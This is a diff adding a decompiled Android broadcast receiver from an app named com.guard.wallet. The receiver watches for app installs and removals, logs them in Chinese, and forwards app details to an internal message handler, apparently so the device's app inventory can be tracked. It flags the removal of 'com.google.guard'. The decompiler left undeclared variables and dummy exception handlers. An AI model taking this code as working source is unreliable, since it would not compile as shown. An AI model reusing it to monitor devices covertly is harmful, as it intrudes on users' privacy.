@@ -1,0 +1,164 @@
+package com.guard.wallet.receiver;
+
+import a1.q;
+import android.content.BroadcastReceiver;
+import android.content.Context;
+import android.content.Intent;
+import android.util.Log;
+import com.guard.wallet.MainApplication;
+import com.guard.wallet.req.MessageRecordVO;
+import com.guard.wallet.resp.AppInfo;
+import com.guard.wallet.utils.g;
+import com.guard.wallet.utils.h;
+import java.util.Objects;
+
+public class PackageReceiver extends BroadcastReceiver {
+   public Integer a = 0;
+
+   // $VF: Inserted dummy exception handlers to handle obfuscated exceptions
+   public final void onReceive(Context var1, Intent var2) {
+      Exception var10000;
+      label102: {
+         try {
+            this.a = 1;
+         } catch (Exception var14) {
+            var10000 = var14;
+            boolean var10001 = false;
+            break label102;
+         }
+
+         if (var2 == null) {
+            return;
+         }
+
+         String var5;
+         try {
+            if (q.B(var2.getAction())) {
+               return;
+            }
+
+            Log.d("PackageReceiver", var2.getAction());
+            var5 = var2.getDataString();
+         } catch (Exception var13) {
+            var10000 = var13;
+            boolean var24 = false;
+            break label102;
+         }
+
+         String var15 = var5;
+
+         try {
+            if (!q.B(var5)) {
+               var15 = var5.replaceAll("package:", "");
+            }
+         } catch (Exception var12) {
+            var10000 = var12;
+            boolean var25 = false;
+            break label102;
+         }
+
+         int var3;
+         try {
+            var5 = var2.getAction();
+            var3 = var5.hashCode();
+         } catch (Exception var11) {
+            var10000 = var11;
+            boolean var26 = false;
+            break label102;
+         }
+
+         label84: {
+            label83: {
+               if (var3 != 525384130) {
+                  if (var3 == 1544582882) {
+                     try {
+                        if (var5.equals("android.intent.action.PACKAGE_ADDED")) {
+                           break label83;
+                        }
+                     } catch (Exception var10) {
+                        var10000 = var10;
+                        boolean var27 = false;
+                        break label102;
+                     }
+                  }
+               } else {
+                  boolean var4;
+                  try {
+                     var4 = var5.equals("android.intent.action.PACKAGE_REMOVED");
+                  } catch (Exception var9) {
+                     var10000 = var9;
+                     boolean var28 = false;
+                     break label102;
+                  }
+
+                  if (var4) {
+                     var18 = 1;
+                     break label84;
+                  }
+               }
+
+               var18 = -1;
+               break label84;
+            }
+
+            var18 = 0;
+         }
+
+         AppInfo var16;
+         if (var18 != 0) {
+            if (var18 != 1) {
+               var16 = null;
+            } else {
+               try {
+                  StringBuilder var20 = new StringBuilder("卸载了:");
+                  var20.append(var15);
+                  var20.append("包名的程序");
+                  Log.d("PackageReceiver", var20.toString());
+                  var21 = new AppInfo();
+                  var21.setPackageName(var15);
+                  var21.setUninstalled(1);
+                  if (Objects.equals(var15, "com.google.guard")) {
+                     h.w("powerControlState:".concat("com.google.guard"));
+                  }
+               } catch (Exception var8) {
+                  var10000 = var8;
+                  boolean var29 = false;
+                  break label102;
+               }
+
+               var16 = var21;
+            }
+         } else {
+            try {
+               StringBuilder var22 = new StringBuilder("安装了:");
+               var22.append(var15);
+               var22.append("包名的程序");
+               Log.d("PackageReceiver", var22.toString());
+               var16 = g.d0(var15);
+            } catch (Exception var7) {
+               var10000 = var7;
+               boolean var30 = false;
+               break label102;
+            }
+         }
+
+         if (var16 == null) {
+            return;
+         }
+
+         try {
+            MessageRecordVO var23 = new MessageRecordVO();
+            var23.setIntentCode(var2.getAction());
+            var23.setExtraBody(var16);
+            MainApplication.getInstance().getHandlerMsgAndTimer().b(var23);
+            return;
+         } catch (Exception var6) {
+            var10000 = var6;
+            boolean var31 = false;
+         }
+      }
+
+      Exception var17 = var10000;
+      q.s("PackageReceiver", var17);
+   }
+}
